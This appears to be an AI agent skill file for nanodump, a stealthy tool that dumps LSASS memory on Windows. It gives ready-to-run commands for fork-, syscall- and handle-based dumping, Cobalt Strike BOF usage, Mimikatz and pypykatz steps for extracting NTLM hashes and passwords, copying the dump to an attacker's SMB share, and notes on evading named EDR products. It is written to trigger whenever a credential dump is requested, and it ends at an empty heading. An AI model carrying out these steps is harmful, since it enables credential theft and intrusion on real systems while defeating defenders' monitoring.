---
name: nanodump
description: "Stealthy LSASS memory dumper using syscalls, handle duplication, and fork-based techniques to evade EDR and AV. Use when asked to dump LSASS memory for credential extraction, create a minidump of LSASS without triggering EDR, extract NTLM hashes and Kerberos tickets from memory, or perform a stealthy credential dump on a Windows host."
license: MIT
compatibility: "Windows x64 only. Compile with Visual Studio or precompile. Available as EXE, BOF (Beacon Object File), and reflective DLL."
metadata:
  author: AeonDave
  version: "1.0"
---

# nanodump

Stealthy LSASS minidump tool — syscalls + fork-based techniques to bypass modern EDR solutions.

## Concept

nanodump creates a minidump of the LSASS process using:
- **Direct syscalls** (avoids hooked ntdll APIs)
- **Fork + minidump** (dumping LSASS fork, not LSASS itself)
- **Handle duplication** (uses existing handles)
- **Elevated handles** from another process
- **Silent process exit** technique

The resulting `.dmp` can be parsed with Mimikatz offline.

## Quick Start

```cmd
# Basic dump via LSASS fork (most stealthy)
nanodump.exe --fork --write C:\Windows\Temp\lsass.dmp

# Dump with write to file via syscall
nanodump.exe --write C:\Windows\Temp\lsass.dmp

# BOF usage in Cobalt Strike
inline-execute nanodump.o --fork --write lsass.dmp
```

## Core Flags

| Flag | Description |
|------|-------------|
| `--write <path>` | Write dump to file path |
| `--fork` | Fork LSASS before dumping (stealth) |
| `--snapshot` | Use process snapshot (NtCreateProcessEx) |
| `--dup` | Duplicate LSASS handle from another process |
| `--elevate-handle` | Elevate handle via existing handle in another proc |
| `--silent-process-exit` | Use SilentProcessExit to dump |
| `--pid <n>` | Specify LSASS PID manually |
| `--sec-logon` | Use secondary logon handle |
| `--malseclogon` | Abuse MalSecLogon technique |
| `--help` | Show all options |

## Post-Dump: Credential Extraction

```bash
# Transfer dump to Linux and parse with pypykatz
pypykatz lsa minidump lsass.dmp

# Parse on Windows with Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords

# Extract NTLM hashes only
pypykatz lsa minidump lsass.dmp -o hashes.txt
```

## Common Workflows

```cmd
# Stealthiest: fork + write to temp
nanodump.exe --fork --write C:\Windows\Temp\lsass.dmp

# Transfer dump to attacker
# Via Cobalt Strike: download C:\Windows\Temp\lsass.dmp
# Via SMB: copy lsass.dmp \\attacker\share\

# Parse on Kali
pypykatz lsa minidump lsass.dmp

# Use in CS as BOF
inline-execute nanodump.o --fork --write lsass.dmp
download lsass.dmp
```

## Detection Evasion Notes

- `--fork` avoids direct LSASS access — EDR sees fork process, not LSASS dump
- Direct syscalls bypass user-mode API hooks (CrowdStrike, Defender ATP)
- Combine with process masquerading for additional evasion
- Avoid writing to predictable paths (`C:\Windows\Temp\lsass.dmp` is monitored)

## Resources

| File | When to load |
|------|--------------|
| `references/lsass-techniques.md` | All LSASS dump techniques, pypykatz parsing, hash extraction, detection landscape |

## Structuring This Skill
